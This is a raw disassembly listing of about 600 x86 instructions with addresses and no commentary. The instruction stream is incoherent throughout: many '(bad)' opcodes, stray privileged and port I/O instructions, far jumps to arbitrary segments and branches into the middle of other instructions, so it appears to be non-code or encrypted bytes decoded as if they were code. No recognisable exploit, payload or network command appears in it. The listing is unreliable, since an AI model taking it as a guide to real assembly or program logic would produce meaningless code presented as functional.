  6b47e0:	lods   al,BYTE PTR ds:[esi]
  6b47e1:	nop
  6b47e2:	sbb    dl,ch
  6b47e4:	ffree  st(4)
  6b47e6:	pop    ds
  6b47e7:	inc    esi
  6b47e8:	push   ebx
  6b47e9:	dec    ecx
  6b47ea:	sahf   
  6b47eb:	fisttp WORD PTR [ebp+ecx*8+0x53]
  6b47ef:	fidivr WORD PTR [edx+0x60882d1c]
  6b47f5:	xor    eax,0x6a27b5ca
  6b47fa:	jbe    0x6b47c5
  6b47fc:	mov    edx,0xf12575db
  6b4801:	mov    edx,0xbf6b9087
  6b4806:	mov    al,ds:0x8fd6dae1
  6b480b:	pop    ebx
  6b480c:	hlt    
  6b480d:	sub    ah,BYTE PTR [ecx+0x13]
  6b4810:	jno    0x6b479a
  6b4812:	test   al,0xd7
  6b4814:	bnd jg 0x6b47dc
  6b4817:	ins    BYTE PTR es:[edi],dx
  6b4818:	jb     0x6b47b8
  6b481a:	adc    ah,BYTE PTR [si+0x79]
  6b481e:	out    dx,al
  6b481f:	aam    0x1d
  6b4821:	pushf  
  6b4822:	jecxz  0x6b4848
  6b4824:	jp     0x6b4809
  6b4826:	pop    es
  6b4827:	sub    esi,ebp
  6b4829:	xor    BYTE PTR [edi+0x793ffff9],dh
  6b482f:	stc    
  6b4830:	test   al,0x85
  6b4832:	ja     0x6b47f2
  6b4834:	bound  ecx,QWORD PTR [edx]
  6b4836:	imul   ecx,DWORD PTR [ebx],0x4b561267
  6b483c:	adc    al,0xe0
  6b483e:	sub    eax,DWORD PTR [edx-0x527c0aee]
  6b4844:	aam    0xf0
  6b4846:	or     al,0x8a
  6b4848:	mov    eax,ds:0xa3356715
  6b484d:	test   DWORD PTR [ebx-0x6ce8d870],ebp
  6b4853:	fisubr DWORD PTR [eax+0x14]
  6b4856:	sahf   
  6b4857:	fnstenv [eax+0x2c]
  6b485a:	shl    DWORD PTR [esp-0x6],0xa7
  6b485f:	and    eax,0xdb633e32
  6b4864:	icebp  
  6b4865:	enter  0x587a,0xb7
  6b4869:	pushf  
  6b486a:	out    dx,al
  6b486b:	mov    esi,cs
  6b486d:	ins    BYTE PTR es:[edi],dx
  6b486e:	int    0xb2
  6b4870:	les    edx,FWORD PTR [edi]
  6b4872:	std    
  6b4873:	jne    0x6b4807
  6b4875:	inc    ebp
  6b4876:	sub    eax,0x90f4f260
  6b487b:	mov    ebx,DWORD PTR [edi+0x3561b691]
  6b4881:	xchg   ecx,eax
  6b4882:	jp     0x6b480e
  6b4884:	ja     0x6b486a
  6b4886:	mov    al,ds:0xef260e28
  6b488b:	push   cs
  6b488c:	jne    0x6b4891
  6b488e:	retf   
  6b488f:	outs   dx,DWORD PTR ds:[esi]
  6b4890:	inc    ebx
  6b4891:	mov    edx,0xd3b9c038
  6b4896:	xor    BYTE PTR [ecx+0x4ebcfe5b],dl
  6b489c:	sub    DWORD PTR [eax+0xb984eb5],0x46
  6b48a3:	bound  esp,QWORD PTR [ebp-0x4507a56b]
  6b48a9:	(bad)  
  6b48aa:	cmp    al,0xec
  6b48ac:	pusha  
  6b48ad:	test   cl,cl
  6b48af:	stos   DWORD PTR es:[edi],eax
  6b48b0:	enter  0xc1fc,0x1a
  6b48b4:	push   edx
  6b48b5:	xchg   DWORD PTR [esi-0x261e44c8],ecx
  6b48bb:	fisub  WORD PTR [ebx+0x2f]
  6b48be:	cmp    BYTE PTR [ebx-0x50],0x33
  6b48c2:	adc    edx,ebp
  6b48c4:	mov    dl,0x81
  6b48c6:	add    eax,0x8a5f7cb0
  6b48cb:	mov    ebp,DWORD PTR [edx-0x56]
  6b48ce:	hlt    
  6b48cf:	cmp    cl,BYTE PTR [esi-0x26293f5f]
  6b48d5:	sbb    BYTE PTR [edi],ch
  6b48d7:	das    
  6b48d8:	pop    es
  6b48d9:	xor    BYTE PTR [edi+0x3b],0x77
  6b48dd:	mov    ebx,0x866ccb19
  6b48e2:	(bad)  
  6b48e3:	cmp    dl,BYTE PTR [edx]
  6b48e5:	in     al,0xcc
  6b48e7:	iret   
  6b48e8:	or     ebx,ebp
  6b48ea:	(bad)  
  6b48eb:	retf   
  6b48ec:	mov    ecx,0xd40a7617
  6b48f1:	cmc    
  6b48f2:	cmp    eax,DWORD PTR [esi+0xe]
  6b48f5:	xchg   esi,eax
  6b48f6:	data16 not BYTE PTR [ecx+0x62]
  6b48fa:	or     BYTE PTR [esi+0x12],0x8f
  6b48fe:	push   ebx
  6b48ff:	or     BYTE PTR [eax],bl
  6b4901:	hlt    
  6b4902:	sbb    bh,cl
  6b4904:	adc    al,0x3a
  6b4907:	jno    0x6b4918
  6b4909:	xlat   BYTE PTR ds:[ebx]
  6b490a:	mov    DWORD PTR [ecx+0x0],esi
  6b490d:	push   ds
  6b490e:	or     ebp,DWORD PTR [ecx]
  6b4910:	sbb    al,0xe8
  6b4912:	push   cs
  6b4913:	das    
  6b4914:	aam    0x2e
  6b4916:	mov    al,0x24
  6b4918:	jmp    0xae5e1669
  6b491d:	sbb    DWORD PTR [ebx],edx
  6b491f:	dec    ebp
  6b4920:	dec    eax
  6b4921:	xchg   edi,eax
  6b4922:	lods   al,BYTE PTR ds:[esi]
  6b4923:	mov    al,ds:0x37b43bfb
  6b4928:	les    edi,FWORD PTR [ecx-0x16841ef7]
  6b492e:	pop    ebp
  6b492f:	mov    cl,0xc
  6b4931:	cli    
  6b4932:	icebp  
  6b4933:	mov    eax,0xbbaf6d65
  6b4938:	in     eax,dx
  6b4939:	js     0x6b49a6
  6b493b:	pop    ecx
  6b493c:	sbb    dl,BYTE PTR [ecx+ebx*1-0x44]
  6b4940:	add    bh,BYTE PTR [edx]
  6b4942:	mov    cs,WORD PTR [edi+0x3d]
  6b4945:	xor    BYTE PTR [edx+0x7b],dl
  6b4948:	add    DWORD PTR [ecx+eiz*4],ecx
  6b494b:	mov    edi,0x5350177b
  6b4950:	repnz out 0x9f,eax
  6b4953:	lds    esp,FWORD PTR [eax+0x5dbb5ab8]
  6b4959:	out    dx,al
  6b495a:	repnz test eax,0x5e92cb52
  6b4960:	loopne 0x6b4957
  6b4962:	fld    DWORD PTR [eax-0x4]
  6b4965:	sbb    eax,0x8b1f164b
  6b496a:	jae    0x6b4960
  6b496c:	and    DWORD PTR [esp+edi*8-0x58],0x8106ce42
  6b4974:	je     0x6b49ae
  6b4976:	fstp   DWORD PTR [ecx+0xc7f5069]
  6b497c:	xor    BYTE PTR [edx-0x69],bh
  6b497f:	out    dx,al
  6b4980:	pop    ebx
  6b4981:	sub    al,0xf7
  6b4983:	in     eax,dx
  6b4984:	push   ebp
  6b4985:	or     esi,0xffffffdf
  6b4988:	pop    ds
  6b4989:	in     eax,0x6a
  6b498b:	push   esp
  6b498c:	into   
  6b498d:	rol    BYTE PTR [ebp+0x6],cl
  6b4990:	and    al,dh
  6b4992:	pop    es
  6b4993:	and    bh,bl
  6b4995:	jmp    0xbbc7:0x84b6d100
  6b499c:	xor    dl,BYTE PTR [edx]
  6b499e:	pop    ss
  6b499f:	aaa    
  6b49a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b49a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b49a2:	out    dx,eax
  6b49a3:	mov    ds:0xc8e0321e,eax
  6b49a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b49a9:	push   ss
  6b49aa:	fs dec esp
  6b49ac:	call   FWORD PTR [edi]
  6b49ae:	cmp    BYTE PTR [esi+0x433cd9ae],bh
  6b49b4:	(bad)  
  6b49b5:	add    ebx,eax
  6b49b7:	mov    bl,0xfe
  6b49b9:	mov    esp,0xf80c142b
  6b49be:	aas    
  6b49bf:	ret    0x747f
  6b49c2:	jno    0x6b4968
  6b49c4:	add    BYTE PTR [ebx],dl
  6b49c6:	outs   dx,BYTE PTR ds:[esi]
  6b49c7:	stos   BYTE PTR es:[edi],al
  6b49c8:	jae    0x6b4a06
  6b49ca:	add    ah,cl
  6b49cc:	stos   DWORD PTR es:[edi],eax
  6b49cd:	jg     0x6b4a1d
  6b49cf:	imul   BYTE PTR [edx+0x45fea7ec]
  6b49d5:	clc    
  6b49d6:	(bad)  [edi]
  6b49d8:	ins    DWORD PTR es:[edi],dx
  6b49d9:	sub    al,0xd6
  6b49db:	mov    ds:0xf069756d,al
  6b49e0:	mov    edx,0x75186899
  6b49e5:	mov    ch,0x57
  6b49e7:	xchg   DWORD PTR [esi+0x6c69872c],edi
  6b49ed:	mov    ah,0x82
  6b49ef:	stos   DWORD PTR es:[edi],eax
  6b49f0:	inc    esp
  6b49f1:	xchg   BYTE PTR [ebp-0x5f],dl
  6b49f4:	sbb    bh,bl
  6b49f6:	pop    es
  6b49f7:	pop    edi
  6b49f8:	sbb    dh,dh
  6b49fa:	inc    ebp
  6b49fb:	test   DWORD PTR [ecx+0x730d798d],esp
  6b4a01:	add    DWORD PTR [esi+0x2a3db47a],ecx
  6b4a07:	mov    esi,DWORD PTR [ecx+0x57cf30f9]
  6b4a0d:	(bad)  
  6b4a0e:	repnz cli 
  6b4a10:	or     DWORD PTR [esi],0xd3f48062
  6b4a16:	mov    es,WORD PTR [edi-0x3a]
  6b4a19:	dec    esi
  6b4a1a:	xor    ebp,eax
  6b4a1c:	fucomp st(1)
  6b4a1e:	pop    eax
  6b4a1f:	xor    eax,0x799d2304
  6b4a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b4a25:	pop    ebp
  6b4a26:	pop    ds
  6b4a27:	aad    0x51
  6b4a29:	mov    edx,0x4784b0e1
  6b4a2e:	rcl    BYTE PTR [ebx+0xc],cl
  6b4a31:	ja     0x6b49e2
  6b4a33:	hlt    
  6b4a34:	neg    BYTE PTR [ebp+0x27d5254d]
  6b4a3a:	sbb    al,0xd7
  6b4a3c:	repnz cmova ecx,DWORD PTR gs:[ebx-0x7c]
  6b4a42:	jo     0x6b4a9e
  6b4a44:	ret    
  6b4a45:	jnp    0x6b4a63
  6b4a47:	das    
  6b4a48:	outs   dx,BYTE PTR ds:[esi]
  6b4a49:	sub    eax,0x52595df3
  6b4a4e:	les    edi,FWORD PTR [ecx]
  6b4a50:	fmul   QWORD PTR [ebp+0x1aea01a2]
  6b4a56:	and    DWORD PTR [edx-0x2557d2cb],eax
  6b4a5c:	mov    dh,0xfa
  6b4a5e:	mov    dl,0x81
  6b4a60:	in     eax,dx
  6b4a61:	les    esi,FWORD PTR ds:0x3021639c
  6b4a67:	adc    eax,0xf1e2df41
  6b4a6c:	sahf   
  6b4a6d:	shr    ecx,cl
  6b4a6f:	lods   eax,DWORD PTR ds:[esi]
  6b4a70:	xchg   DWORD PTR [edi-0x5],esi
  6b4a73:	xchg   ebp,eax
  6b4a74:	xlat   BYTE PTR ds:[ebx]
  6b4a75:	mov    eax,0xf1a66e85
  6b4a7a:	xchg   eax,ebx
  6b4a7c:	out    0xf,eax
  6b4a7e:	dec    ebp
  6b4a7f:	hlt    
  6b4a80:	repz dec esp
  6b4a82:	rol    esp,0x5a
  6b4a85:	push   es
  6b4a86:	push   cs
  6b4a87:	(bad)  
  6b4a88:	popa   
  6b4a89:	mov    ecx,0xddf7201
  6b4a8e:	bswap  ebx
  6b4a90:	dec    ebx
  6b4a91:	shl    BYTE PTR [esi],cl
  6b4a93:	inc    edx
  6b4a94:	not    bh
  6b4a96:	xor    eax,0x5d2496b1
  6b4a9b:	lds    edx,FWORD PTR [eax]
  6b4a9d:	fidivr DWORD PTR [ebx-0x2f99e382]
  6b4aa3:	idiv   BYTE PTR [eax]
  6b4aa5:	js     0x6b4a96
  6b4aa7:	test   eax,0x443b1d6f
  6b4aac:	inc    ecx
  6b4aad:	in     al,0x69
  6b4aaf:	das    
  6b4ab0:	test   eax,0x296ad701
  6b4ab5:	adc    BYTE PTR [ebp+0x54899b2e],al
  6b4abb:	cmp    BYTE PTR [ecx-0x63],ah
  6b4abe:	sbb    DWORD PTR ds:0x13b85ce2,eax
  6b4ac4:	jmp    FWORD PTR [ebp-0x9ee315f]
  6b4aca:	xor    BYTE PTR [ecx-0x17],0x21
  6b4ace:	ja     0x6b4ac6
  6b4ad0:	ss jle 0x6b4adf
  6b4ad3:	out    0x2f,eax
  6b4ad5:	pop    esi
  6b4ad6:	pop    ebx
  6b4ad7:	cmp    bh,bh
  6b4ad9:	pop    ebp
  6b4ada:	cwde   
  6b4adb:	pop    esp
  6b4adc:	loope  0x6b4acd
  6b4ade:	fbld   TBYTE PTR [edi+0x592f0c6]
  6b4ae4:	ss test eax,0x2a7c207d
  6b4aea:	dec    edi
  6b4aeb:	add    bh,dh
  6b4aed:	jbe    0x6b4a7b
  6b4aef:	es inc esp
  6b4af1:	push   0xe07d24ea
  6b4af6:	adc    DWORD PTR [ecx-0x7591b31e],esi
  6b4afc:	xor    BYTE PTR [edx+edi*8+0x17652869],dl
  6b4b03:	and    al,0x2f
  6b4b05:	mov    bl,0x8b
  6b4b07:	std    
  6b4b08:	dec    eax
  6b4b09:	je     0x6b4afa
  6b4b0b:	fidivr DWORD PTR ds:0x3d83ed5d
  6b4b11:	xchg   edi,eax
  6b4b12:	mov    bl,0x4a
  6b4b14:	pcmpeqb mm0,mm6
  6b4b17:	sub    dl,BYTE PTR [ecx-0x242237dc]
  6b4b1d:	push   ecx
  6b4b1e:	imul   ebx,DWORD PTR [esi+0x45be2b24],0xbef0695c
  6b4b28:	and    BYTE PTR gs:[esi-0x63],ch
  6b4b2c:	jmp    0x6b4b64
  6b4b2e:	cwde   
  6b4b2f:	daa    
  6b4b30:	push   ebp
  6b4b31:	jae    0x6b4ad2
  6b4b33:	adc    eax,0x2c215692
  6b4b38:	fnstcw WORD PTR [esi+edx*1]
  6b4b3b:	test   al,0x3b
  6b4b3d:	enter  0x88c0,0xa1
  6b4b41:	mov    eax,ds:0x667741e2
  6b4b46:	lds    ebx,FWORD PTR [ebp+0x2e]
  6b4b49:	and    DWORD PTR [esi],esp
  6b4b4b:	push   0xf4b4b6d6
  6b4b50:	(bad)  
  6b4b51:	mov    ch,0xa0
  6b4b53:	and    edi,edx
  6b4b55:	lds    ecx,FWORD PTR [edi+0x35f07aef]
  6b4b5b:	(bad)  
  6b4b5c:	xchg   edi,eax
  6b4b5d:	cdq    
  6b4b5e:	cmp    esi,ecx
  6b4b60:	(bad)  
  6b4b61:	addr16 mov al,0x62
  6b4b64:	int    0x9e
  6b4b66:	jns    0x6b4b1d
  6b4b68:	popf   
  6b4b69:	lds    esp,FWORD PTR [ecx]
  6b4b6b:	sbb    ebp,ebp
  6b4b6d:	adc    al,0xf0
  6b4b6f:	scas   al,BYTE PTR es:[edi]
  6b4b70:	mov    ebx,0x518dbdfa
  6b4b75:	leave  
  6b4b76:	xor    DWORD PTR [ebx],edx
  6b4b78:	jne    0x6b4bb2
  6b4b7a:	jecxz  0x6b4bd8
  6b4b7c:	in     al,0x16
  6b4b7e:	sub    esi,esp
  6b4b80:	or     edi,DWORD PTR [esi+0x5ec28bc]
  6b4b86:	loope  0x6b4b5a
  6b4b88:	dec    ebx
  6b4b89:	sar    DWORD PTR [edx-0x3f952249],1
  6b4b8f:	repnz mov ds:0x48b9c2e1,al
  6b4b95:	ds push cs
  6b4b97:	not    ebp
  6b4b99:	xchg   ecx,eax
  6b4b9b:	imul   esp,DWORD PTR [edi+0x565abbef],0xffffffbd
  6b4ba2:	mov    edi,0x56f78ad8
  6b4ba7:	leave  
  6b4ba8:	fmul   DWORD PTR [esi-0x2240bde5]
  6b4bae:	fdiv   DWORD PTR [eax-0x376a011b]
  6b4bb4:	nop
  6b4bb5:	sbb    ch,BYTE PTR [ebx]
  6b4bb7:	xor    eax,0x8ddf51d8
  6b4bbc:	or     BYTE PTR [esi+0x15791e8f],bh
  6b4bc2:	and    eax,esi
  6b4bc4:	ins    DWORD PTR es:[edi],dx
  6b4bc5:	inc    esi
  6b4bc6:	sbb    eax,0xc5fe012c
  6b4bcb:	lea    edi,[ecx+ecx*4-0x2b12709e]
  6b4bd2:	xchg   ch,al
  6b4bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b4bd5:	fdivr  QWORD PTR [edi-0x42]
  6b4bd8:	add    al,0xfd
  6b4bda:	inc    edx
  6b4bdb:	out    0xb5,eax
  6b4bdd:	jle    0x6b4c3f
  6b4bdf:	inc    ecx
  6b4be0:	fbstp  TBYTE PTR [esi+0x25254106]
  6b4be6:	daa    
  6b4be7:	inc    edi
  6b4be8:	data16 jns 0x6b4c17
  6b4beb:	cld    
  6b4bec:	mov    dl,0x48
  6b4bee:	inc    edi
  6b4bef:	fucom  st(6)
  6b4bf1:	add    ebx,DWORD PTR [edi+ecx*4-0x36a4112b]
  6b4bf8:	cli    
  6b4bf9:	cld    
  6b4bfa:	dec    eax
  6b4bfb:	test   BYTE PTR [ebp+0x36],ah
  6b4bfe:	in     eax,dx
  6b4bff:	pop    ebp
  6b4c00:	and    eax,0x5c0d6af3
  6b4c05:	(bad)
  6b4c08:	test   al,0x38
  6b4c0a:	sbb    eax,0x4be7601a
  6b4c0f:	sbb    edi,DWORD PTR [edx]
  6b4c11:	add    edi,edi
  6b4c13:	push   eax
  6b4c14:	mov    ebp,0xa99ab039
  6b4c19:	repnz push cs
  6b4c1b:	or     cl,dl
  6b4c1d:	pop    ecx
  6b4c1e:	adc    al,0xdd
  6b4c20:	jne    0x6b4be7
  6b4c22:	ficomp WORD PTR [eax]
  6b4c24:	sub    ebp,DWORD PTR [ecx-0x1a9c0f26]
  6b4c2a:	xor    BYTE PTR [ecx+0x3],al
  6b4c2d:	clc    
  6b4c2e:	mov    eax,ds:0x98d592ca
  6b4c33:	inc    edi
  6b4c34:	inc    edx
  6b4c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b4c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b4c37:	xor    eax,0x3a1027ce
  6b4c3c:	retf   
  6b4c3d:	stos   DWORD PTR es:[edi],eax
  6b4c3e:	mov    edx,0xb380ba9e
  6b4c43:	sar    BYTE PTR [ebx+0x5b51f444],cl
  6b4c49:	jmp    0x6b4c76
  6b4c4b:	mov    edx,0x6cdaf03c
  6b4c50:	ror    esi,cl
  6b4c52:	dec    eax
  6b4c53:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b4c55:	jb     0x6b4cb8
  6b4c57:	jge    0x6b4bff
  6b4c59:	xchg   BYTE PTR [ecx+0x38],dl
  6b4c5c:	aaa    
  6b4c5d:	cmp    dl,BYTE PTR [esi]
  6b4c5f:	sub    BYTE PTR [edx-0x44],0x71
  6b4c63:	stos   DWORD PTR es:[edi],eax
  6b4c64:	(bad)
  6b4c67:	cs push esp
  6b4c69:	pop    eax
  6b4c6a:	xchg   edi,eax
  6b4c6b:	pop    es
  6b4c6c:	adc    DWORD PTR [eax-0x148792b8],edx
  6b4c72:	sbb    edi,ebx
  6b4c74:	in     al,dx
  6b4c75:	sub    al,0x10
  6b4c77:	sub    BYTE PTR cs:[edi-0x5],0x8a
  6b4c7c:	jae    0x6b4c8a
  6b4c7e:	outs   dx,DWORD PTR ds:[esi]
  6b4c7f:	and    ebp,DWORD PTR [edx]
  6b4c81:	xchg   edi,eax
  6b4c82:	daa    
  6b4c83:	dec    esp
  6b4c84:	ins    BYTE PTR es:[edi],dx
  6b4c85:	jb     0x6b4c9b
  6b4c87:	adc    DWORD PTR [ebx+0x17b766d1],0x7b
  6b4c8e:	mov    BYTE PTR [esi],dl
  6b4c90:	pop    edx
  6b4c91:	(bad)  
  6b4c92:	inc    dl
  6b4c94:	dec    ebp
  6b4c95:	pop    edi
  6b4c96:	and    edi,DWORD PTR [edi+ebx*1]
  6b4c99:	aam    0xeb
  6b4c9b:	sub    esi,DWORD PTR [edi+0x7a]
  6b4c9e:	and    dl,BYTE PTR [esp+edi*2]
  6b4ca1:	mov    eax,ds:0xfa9fe85b
  6b4ca6:	adc    edx,ebx
  6b4ca8:	data16 outs dx,BYTE PTR ds:[esi]
  6b4caa:	sub    ah,ah
  6b4cac:	xor    al,0x80
  6b4cae:	scas   eax,DWORD PTR es:[edi]
  6b4caf:	jle    0x6b4d27
  6b4cb1:	cs cmc 
  6b4cb3:	int3   
  6b4cb4:	aad    0x4
  6b4cb6:	jmp    0x6b4c6a
  6b4cb8:	cmc    
  6b4cb9:	fadd   st(0),st
  6b4cbb:	scas   eax,DWORD PTR es:[di]
  6b4cbd:	stos   DWORD PTR es:[edi],eax
  6b4cbe:	mov    bl,0xba
  6b4cc0:	xchg   ebp,edi
  6b4cc2:	push   edi
  6b4cc3:	popa   
  6b4cc4:	inc    eax
  6b4cc5:	stos   BYTE PTR es:[edi],al
  6b4cc6:	ss xchg ch,bh
  6b4cc9:	mov    eax,ds:0x7e02ae7c
  6b4cce:	aam    0x16
  6b4cd0:	ret    0xfaf2
  6b4cd3:	jmp    0xbbcf:0x7a263dfd
  6b4cda:	mov    al,ds:0xa841e4ff
  6b4cdf:	mov    dl,0x6f
  6b4ce1:	(bad)  
  6b4ce2:	loope  0x6b4d35
  6b4ce4:	mov    esi,0x120fb272
  6b4ce9:	push   0xfb75b07
  6b4cee:	pop    ecx
  6b4cef:	mov    ebx,0x34e22a18
  6b4cf4:	add    dl,bh
  6b4cf6:	mov    esp,0x72b9e02a
  6b4cfb:	fcomi  st,st(5)
  6b4cfd:	or     dh,bh
  6b4cff:	stos   BYTE PTR es:[edi],al
  6b4d00:	jecxz  0x6b4d5d
  6b4d02:	fsubp  st(0),st
  6b4d04:	add    ch,BYTE PTR [eax+edi*2+0x4a]
  6b4d08:	sbb    al,0x3b
  6b4d0a:	sbb    al,0x8a
  6b4d0c:	outs   dx,DWORD PTR ds:[esi]
  6b4d0d:	xchg   ah,dh
  6b4d0f:	int3   
  6b4d10:	xchg   ebx,eax
  6b4d11:	jnp    0x6b4d8a
  6b4d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b4d14:	nop    DWORD PTR [edi+0x32]
  6b4d18:	or     DWORD PTR [ecx+0x26dfb47e],esi
  6b4d1e:	hlt    
  6b4d1f:	jne    0x6b4cb1
  6b4d21:	and    eax,0x5fc5d1c0
  6b4d26:	mov    bh,BYTE PTR [ecx]
  6b4d28:	iret   
  6b4d29:	xlat   BYTE PTR ds:[ebx]
  6b4d2a:	adc    ch,BYTE PTR [esi+eiz*1+0x3e]
  6b4d2e:	cmp    bh,dl
  6b4d30:	dec    esi
  6b4d31:	adc    BYTE PTR [ebp-0x73],al
  6b4d34:	imul   ecx,DWORD PTR [ebx+0x4973701c],0xffffffef
  6b4d3b:	cmp    dl,BYTE PTR [esi+0x4491c546]
  6b4d41:	adc    DWORD PTR [edx],esp
  6b4d43:	ds inc eax
  6b4d45:	ds cmp al,0xe2
  6b4d48:	push   ecx
  6b4d49:	xor    eax,0x3b0954d9
  6b4d4e:	add    DWORD PTR [ebx+0x42],eax
  6b4d51:	jae    0x6b4d46
  6b4d53:	add    dh,BYTE PTR [ebp-0x19c45521]
  6b4d59:	stc    
  6b4d5a:	aaa    
  6b4d5b:	mov    ebx,0xc8d1ca22
  6b4d60:	(bad)
  6b4d64:	stc    
  6b4d65:	pop    ds
  6b4d66:	push   0xffffffae
  6b4d68:	test   BYTE PTR [edx-0x581721da],dh
  6b4d6e:	sar    ch,0xe8
  6b4d71:	jnp    0x6b4de9
  6b4d73:	repz mov edi,0x8204fc44
  6b4d79:	push   esp
  6b4d7a:	stos   DWORD PTR es:[edi],eax
  6b4d7b:	mov    esp,0x78e771f7
  6b4d80:	cdq    
  6b4d81:	push   0x99457309
  6b4d86:	fsincos 
  6b4d88:	push   es
  6b4d89:	pop    DWORD PTR [eax-0x60]
  6b4d8c:	hlt    
  6b4d8d:	in     eax,dx
  6b4d8e:	paddusb mm7,QWORD PTR [eax+0x3e]
  6b4d92:	mov    ecx,0xdf4e75f6
  6b4d97:	daa    
  6b4d98:	(bad)
  6b4d9c:	retf   
  6b4d9d:	mov    ds:0x1731171e,eax
  6b4da2:	push   es
  6b4da3:	into   
  6b4da4:	mov    esi,0xb6233f56
  6b4da9:	inc    ebp
  6b4daa:	ror    DWORD PTR [esi+0x36b9d0fa],0xc3
  6b4db1:	jo     0x6b4de2
  6b4db3:	mov    DWORD PTR [esi+0x5f],0xf84af1fb
  6b4dba:	cs lahf 
  6b4dbc:	adc    eax,0xfedb2f0d
  6b4dc1:	(bad)  
  6b4dc2:	lods   eax,DWORD PTR ds:[esi]
  6b4dc3:	fisttp DWORD PTR [esi-0x18c3b4c]
  6b4dc9:	jbe    0x6b4dac
  6b4dcb:	push   ecx
  6b4dcc:	push   ecx
  6b4dcd:	or     eax,0x16892c91
  6b4dd2:	frstor [edi-0x23]
  6b4dd5:	xor    cl,BYTE PTR [edx]
  6b4dd7:	nop
  6b4dd8:	ins    DWORD PTR es:[edi],dx
  6b4dd9:	push   es
  6b4dda:	call   0xf2b0:0xf7dc5e44
  6b4de1:	ret    0xb856
  6b4de4:	repz mov al,ds:0x9df7abee
  6b4dea:	dec    edi
  6b4deb:	out    0x67,al
  6b4ded:	sub    BYTE PTR [ebx-0x64],dh
  6b4df0:	mov    ecx,DWORD PTR ds:0x2b87546b
  6b4df6:	pushf  
  6b4df7:	(bad)  
  6b4df9:	mov    esp,0x54d7759d
  6b4dfe:	out    0x23,eax
  6b4e00:	and    ecx,DWORD PTR [edx-0x45b76a91]
  6b4e06:	inc    eax
  6b4e07:	push   ecx
  6b4e08:	mov    WORD PTR [edx+0x67e8718],fs
  6b4e0e:	adc    al,0xe
  6b4e10:	arpl   WORD PTR [edx-0x31],bp
  6b4e13:	and    BYTE PTR [edx-0x7b],al
  6b4e16:	mov    dl,0xc2
  6b4e18:	outs   dx,DWORD PTR ds:[esi]
  6b4e19:	nop
  6b4e1a:	imul   eax,DWORD PTR [edi+0x55232dc2],0xffffffd4
  6b4e21:	push   cs
  6b4e22:	retf   0xb91e
  6b4e25:	outs   dx,DWORD PTR ds:[esi]
  6b4e26:	call   0xa7b1:0xb05355c4
  6b4e2d:	jl     0x6b4e4d
  6b4e2f:	lds    edx,FWORD PTR [ebp+0x6986575b]
  6b4e35:	xchg   edx,eax
  6b4e36:	das    
  6b4e37:	cmp    ah,BYTE PTR [ebp-0x6151e125]
  6b4e3d:	or     dh,BYTE PTR ss:[ebp+eax*8-0x4]
  6b4e42:	jmp    0x6b4ead
  6b4e44:	jmp    0xbfc:0xed33b3ca
  6b4e4b:	imul   edx,DWORD PTR [esi+ebx*4+0x6e],0xffffffb2
  6b4e50:	jmp    0x8f3688a6
  6b4e55:	fwait
  6b4e56:	xchg   esi,eax
  6b4e57:	fidiv  WORD PTR [ecx+0x4be652c]
  6b4e5d:	das    
  6b4e5e:	push   cs
  6b4e5f:	cmp    BYTE PTR [ecx-0x12853def],bl
  6b4e65:	jl     0x6b4ee1
  6b4e67:	ret    0xb5b4
  6b4e6a:	dec    esp
  6b4e6b:	sahf   
  6b4e6c:	mov    esi,DWORD PTR [eax+0xc]
  6b4e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b4e70:	fdivrp st(3),st
  6b4e72:	fidivr WORD PTR [eax-0x6a2822cd]
  6b4e78:	cmc    
  6b4e79:	dec    eax
  6b4e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b4e7b:	mov    ch,0xe0
  6b4e7d:	scas   al,BYTE PTR es:[edi]
  6b4e7e:	sbb    DWORD PTR [ecx],ebx
  6b4e80:	mov    ch,0xa4
  6b4e82:	xor    DWORD PTR [edi-0x22f54043],ebp
  6b4e88:	or     eax,0x77a956b0
  6b4e8d:	inc    ebx
  6b4e8e:	and    dl,BYTE PTR [edi]
  6b4e90:	mov    gs,WORD PTR [ecx+0x40]
  6b4e93:	add    al,dl
  6b4e95:	les    ebp,FWORD PTR [esi]
  6b4e97:	(bad)  
  6b4e98:	jp     0x6b4e2a
  6b4e9a:	mov    eax,ds:0x5bdebc14
  6b4e9f:	cmp    edx,DWORD PTR [ecx-0x37]
  6b4ea2:	sub    DWORD PTR [eax+0x7],ebx
  6b4ea5:	cmp    DWORD PTR [ebp+0x2d6fe9b6],esp
  6b4eab:	cdq    
  6b4eac:	aad    0xcc
  6b4eae:	adc    al,0x12
  6b4eb0:	jns    0x6b4e6b
  6b4eb2:	xchg   ecx,eax
  6b4eb3:	mov    ebp,0xb845af9
  6b4eb8:	add    ch,BYTE PTR [edx]
  6b4eba:	into   
  6b4ebb:	popf   
  6b4ebc:	adc    eax,0x993a90a2
  6b4ec1:	mov    esp,DWORD PTR [edi+0x34]
  6b4ec4:	pop    ds
  6b4ec5:	xor    BYTE PTR [ecx-0x53],dh
  6b4ec8:	add    edx,DWORD PTR [eax]
  6b4eca:	pop    esi
  6b4ecb:	sahf   
  6b4ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b4ecd:	test   DWORD PTR [esi-0x2e19b2d4],edx
  6b4ed3:	ret    0x1ca2
  6b4ed6:	test   ecx,0x3f67c817
  6b4edc:	std    
  6b4edd:	repnz xchg esi,eax
  6b4edf:	test   ebx,ecx
  6b4ee1:	sub    DWORD PTR [esi-0x3b],0xfcaabc99
  6b4ee8:	push   ebp
  6b4ee9:	sub    eax,0x9c510989
  6b4eee:	bound  edx,QWORD PTR [ebx+0x5b347886]
  6b4ef4:	jmp    0x1f999f2c
  6b4ef9:	mov    bl,0xdd
  6b4efb:	dec    ebp
  6b4efc:	(bad)  
  6b4efd:	sub    eax,0xb1f40d1b
  6b4f02:	test   DWORD PTR [eax+0x55],ebx
  6b4f05:	rcr    DWORD PTR [edi],cl
  6b4f07:	jno    0x6b4f4d
  6b4f09:	cs dec esi
